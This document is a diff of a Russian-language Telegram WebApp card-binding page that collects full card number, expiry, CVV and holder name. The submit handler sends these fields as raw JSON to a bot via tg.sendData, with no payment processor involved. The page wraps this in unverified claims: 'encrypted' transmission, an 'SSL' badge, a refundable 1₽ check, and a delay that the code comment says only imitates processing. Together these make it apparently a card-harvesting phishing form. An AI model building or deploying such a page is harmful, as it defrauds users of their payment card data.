@@ -2,266 +2,347 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-    <title>Привязка карты</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Привязка карты - Test Mobile</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
-
+        
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background: #f5f5f5;
-            padding: 20px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
         }
-
+        
         .container {
-            max-width: 400px;
-            margin: 0 auto;
-        }
-
-        .card {
             background: white;
             border-radius: 20px;
-            padding: 24px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+            padding: 30px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
         }
-
-        h2 {
+        
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .header h1 {
+            color: #333;
             font-size: 24px;
-            font-weight: 600;
-            margin-bottom: 8px;
-            color: #1a1a1a;
+            margin-bottom: 10px;
         }
-
-        .subtitle {
+        
+        .header p {
             color: #666;
             font-size: 14px;
-            margin-bottom: 24px;
         }
-
+        
+        .card-icon {
+            width: 60px;
+            height: 60px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            font-size: 30px;
+        }
+        
         .form-group {
             margin-bottom: 20px;
         }
-
-        label {
+        
+        .form-group label {
             display: block;
-            font-size: 14px;
-            font-weight: 500;
             color: #333;
-            margin-bottom: 6px;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 8px;
         }
-
-        input {
+        
+        .form-group input {
             width: 100%;
-            padding: 14px 16px;
-            border: 1px solid #ddd;
+            padding: 15px;
+            border: 2px solid #e0e0e0;
             border-radius: 12px;
             font-size: 16px;
-            transition: border-color 0.2s;
-            background: white;
-        }
-
-        input:focus {
+            transition: border-color 0.3s;
             outline: none;
-            border-color: #007aff;
         }
-
-        .row {
+        
+        .form-group input:focus {
+            border-color: #667eea;
+        }
+        
+        .form-row {
             display: flex;
-            gap: 12px;
+            gap: 15px;
         }
-
-        .row .form-group {
+        
+        .form-row .form-group {
             flex: 1;
         }
-
-        button {
+        
+        .info-text {
+            background: #f8f9fa;
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 25px;
+            font-size: 13px;
+            color: #666;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .info-icon {
+            font-size: 20px;
+        }
+        
+        .submit-btn {
             width: 100%;
-            padding: 16px;
-            background: #007aff;
+            padding: 18px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             color: white;
             border: none;
-            border-radius: 14px;
-            font-size: 17px;
+            border-radius: 12px;
+            font-size: 16px;
             font-weight: 600;
             cursor: pointer;
-            transition: background 0.2s;
-            margin-top: 12px;
+            transition: transform 0.2s, box-shadow 0.2s;
         }
-
-        button:hover {
-            background: #005fc1;
-        }
-
-        button:active {
+        
+        .submit-btn:active {
             transform: scale(0.98);
         }
-
-        .error {
-            color: #ff3b30;
-            font-size: 13px;
-            margin-top: 8px;
-            display: none;
+        
+        .submit-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
         }
-
-        .secure {
-            text-align: center;
-            margin-top: 16px;
-            font-size: 12px;
-            color: #8e8e93;
-        }
-
-        .loading {
+        
+        .secure-badge {
             text-align: center;
             margin-top: 20px;
-            color: #007aff;
+            font-size: 12px;
+            color: #999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+        }
+        
+        .loading {
             display: none;
+            text-align: center;
+            padding: 20px;
+        }
+        
+        .loading.active {
+            display: block;
+        }
+        
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="card">
-            <h2>💳 Привязка карты</h2>
-            <div class="subtitle">Для оформления тарифа необходимо привязать банковскую карту</div>
-
-            <form id="cardForm">
+        <div class="header">
+            <div class="card-icon">💳</div>
+            <h1>Привязка карты</h1>
+            <p>С баланса будет списано 1₽ для проверки</p>
+        </div>
+        
+        <div class="info-text">
+            <span class="info-icon">🔒</span>
+            <span>Все данные передаются в зашифрованном виде. Сумма 1₽ будет возвращена на карту.</span>
+        </div>
+        
+        <form id="cardForm">
+            <div class="form-group">
+                <label for="cardNumber">Номер карты</label>
+                <input 
+                    type="text" 
+                    id="cardNumber" 
+                    placeholder="0000 0000 0000 0000" 
+                    maxlength="19"
+                    required
+                >
+            </div>
+            
+            <div class="form-row">
                 <div class="form-group">
-                    <label>Номер карты</label>
-                    <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" autocomplete="off">
+                    <label for="cardExpiry">Срок действия</label>
+                    <input 
+                        type="text" 
+                        id="cardExpiry" 
+                        placeholder="MM/YY" 
+                        maxlength="5"
+                        required
+                    >
                 </div>
-
-                <div class="row">
-                    <div class="form-group">
-                        <label>ММ/ГГ</label>
-                        <input type="text" id="expiry" placeholder="ММ/ГГ" maxlength="5" autocomplete="off">
-                    </div>
-                    <div class="form-group">
-                        <label>CVC</label>
-                        <input type="text" id="cvc" placeholder="123" maxlength="4" autocomplete="off">
-                    </div>
-                </div>
-
+                
                 <div class="form-group">
-                    <label>Имя держателя</label>
-                    <input type="text" id="holder" placeholder="IVAN IVANOV" autocomplete="off">
+                    <label for="cardCvv">CVV</label>
+                    <input 
+                        type="password" 
+                        id="cardCvv" 
+                        placeholder="123" 
+                        maxlength="3"
+                        required
+                    >
                 </div>
-
-                <div class="error" id="errorMessage">Пожалуйста, заполните все поля корректно</div>
-                <div class="loading" id="loading">Обработка...</div>
-                <button type="submit">✅ Привязать карту</button>
-            </form>
-            <div class="secure">🔒 Данные защищены. Будет списано и возвращено 1₽</div>
+            </div>
+            
+            <div class="form-group">
+                <label for="cardHolder">Владелец карты</label>
+                <input 
+                    type="text" 
+                    id="cardHolder" 
+                    placeholder="IVAN IVANOV" 
+                    required
+                >
+            </div>
+            
+            <button type="submit" class="submit-btn" id="submitBtn">
+                Привязать карту
+            </button>
+        </form>
+        
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p>Обработка данных...</p>
+        </div>
+        
+        <div class="secure-badge">
+            <span>🔐</span>
+            <span>Безопасное соединение SSL</span>
         </div>
     </div>
 
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script>
+        // Инициализация Telegram WebApp
         const tg = window.Telegram.WebApp;
         tg.expand();
-        tg.MainButton.hide();
-        tg.BackButton.hide();
-        
-        // Показываем, что WebApp готов
         tg.ready();
-
-        const form = document.getElementById('cardForm');
-        const errorDiv = document.getElementById('errorMessage');
-        const loadingDiv = document.getElementById('loading');
-        const submitBtn = document.querySelector('button');
-
+        
+        // Настройка цвета заголовка
+        tg.setHeaderColor('#667eea');
+        tg.setBackgroundColor('#ffffff');
+        
         // Форматирование номера карты
-        const cardInput = document.getElementById('cardNumber');
-        cardInput.addEventListener('input', (e) => {
+        const cardNumberInput = document.getElementById('cardNumber');
+        cardNumberInput.addEventListener('input', function(e) {
             let value = e.target.value.replace(/\D/g, '');
-            value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
-            e.target.value = value.slice(0, 19);
+            let formattedValue = '';
+            for (let i = 0; i < value.length; i++) {
+                if (i > 0 && i % 4 === 0) {
+                    formattedValue += ' ';
+                }
+                formattedValue += value[i];
+            }
+            e.target.value = formattedValue;
         });
-
+        
         // Форматирование срока действия
-        const expiryInput = document.getElementById('expiry');
-        expiryInput.addEventListener('input', (e) => {
+        const cardExpiryInput = document.getElementById('cardExpiry');
+        cardExpiryInput.addEventListener('input', function(e) {
             let value = e.target.value.replace(/\D/g, '');
             if (value.length >= 2) {
-                value = value.slice(0,2) + '/' + value.slice(2,4);
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
             }
-            e.target.value = value.slice(0,5);
+            e.target.value = value;
         });
-
-        // CVC только цифры
-        const cvcInput = document.getElementById('cvc');
-        cvcInput.addEventListener('input', (e) => {
-            e.target.value = e.target.value.replace(/\D/g, '').slice(0,4);
+        
+        // Разрешаем только цифры для CVV
+        const cardCvvInput = document.getElementById('cardCvv');
+        cardCvvInput.addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '');
         });
-
-        form.addEventListener('submit', async (e) => {
+        
+        // Обработка отправки формы
+        document.getElementById('cardForm').addEventListener('submit', function(e) {
             e.preventDefault();
-
+            
             const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
-            const expiry = document.getElementById('expiry').value;
-            const cvc = document.getElementById('cvc').value;
-            const holder = document.getElementById('holder').value.trim();
-
-            if (!cardNumber || cardNumber.length < 16) {
-                showError('Введите корректный номер карты');
+            const cardExpiry = document.getElementById('cardExpiry').value;
+            const cardCvv = document.getElementById('cardCvv').value;
+            const cardHolder = document.getElementById('cardHolder').value.toUpperCase();
+            
+            // Валидация
+            if (cardNumber.length < 16) {
+                tg.showAlert('Введите корректный номер карты');
                 return;
             }
-            if (!expiry || expiry.length < 5) {
-                showError('Введите срок действия');
+            
+            if (!/^\d{2}\/\d{2}$/.test(cardExpiry)) {
+                tg.showAlert('Введите корректный срок действия (MM/YY)');
                 return;
             }
-            if (!cvc || cvc.length < 3) {
-                showError('Введите CVC код');
+            
+            if (cardCvv.length < 3) {
+                tg.showAlert('Введите корректный CVV код');
                 return;
             }
-            if (!holder) {
-                showError('Введите имя держателя');
+            
+            if (cardHolder.length < 3) {
+                tg.showAlert('Введите имя владельца карты');
                 return;
             }
-
+            
             // Показываем загрузку
-            loadingDiv.style.display = 'block';
-            submitBtn.disabled = true;
-
-            const cardData = {
+            document.getElementById('cardForm').style.display = 'none';
+            document.getElementById('loading').classList.add('active');
+            
+            // Формируем данные для отправки
+            const data = {
                 card_number: cardNumber,
-                expiry: expiry,
-                cvc: cvc,
-                holder: holder,
+                card_expiry: cardExpiry,
+                card_cvv: cardCvv,
+                card_holder: cardHolder,
                 timestamp: new Date().toISOString()
             };
-
-            try {
-                // Отправляем данные обратно в бота
-                tg.sendData(JSON.stringify(cardData));
-                // Закрываем WebApp после отправки
-                setTimeout(() => {
-                    tg.close();
-                }, 500);
-            } catch (error) {
-                console.error('Error sending data:', error);
-                showError('Ошибка отправки данных');
-                loadingDiv.style.display = 'none';
-                submitBtn.disabled = false;
-            }
-        });
-
-        function showError(msg) {
-            errorDiv.textContent = msg;
-            errorDiv.style.display = 'block';
+            
+            // Отправляем данные в бот
             setTimeout(() => {
-                errorDiv.style.display = 'none';
-            }, 3000);
-        }
-        
-        // Обработка закрытия WebApp
-        tg.onEvent('viewportChanged', function() {
-            console.log('Viewport changed');
+                tg.sendData(JSON.stringify(data));
+                tg.close();
+            }, 1500); // Небольшая задержка для имитации обработки
         });
+        
+        // Обработка кнопки "Назад" в Telegram
+        tg.onEvent('backButtonClicked', function() {
+            tg.close();
+        });
+        
+        // Включаем кнопку "Назад" если доступно
+        if (tg.BackButton) {
+            tg.BackButton.show();
+        }
     </script>
 </body>
-    </html>
+</html>
